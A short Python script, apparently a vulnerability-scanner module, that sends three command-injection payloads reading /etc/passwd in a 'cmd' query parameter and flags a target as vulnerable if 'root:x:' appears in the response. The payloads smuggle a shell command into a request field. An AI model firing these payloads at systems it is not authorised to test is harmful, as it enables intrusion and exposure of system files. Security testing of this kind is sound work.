import requests

payloads = [
    ";cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd"
]

def command_injection(target):
    for payload in payloads:
        try:
            response = requests.get(target, params={"cmd": payload}, timeout=5)
            if "root:x:" in response.text:
                return f"VULNERABLE: Command Injection with payload={payload}"
        except Exception as e:
            return f"Greška: {str(e)}"
    return "Clean"
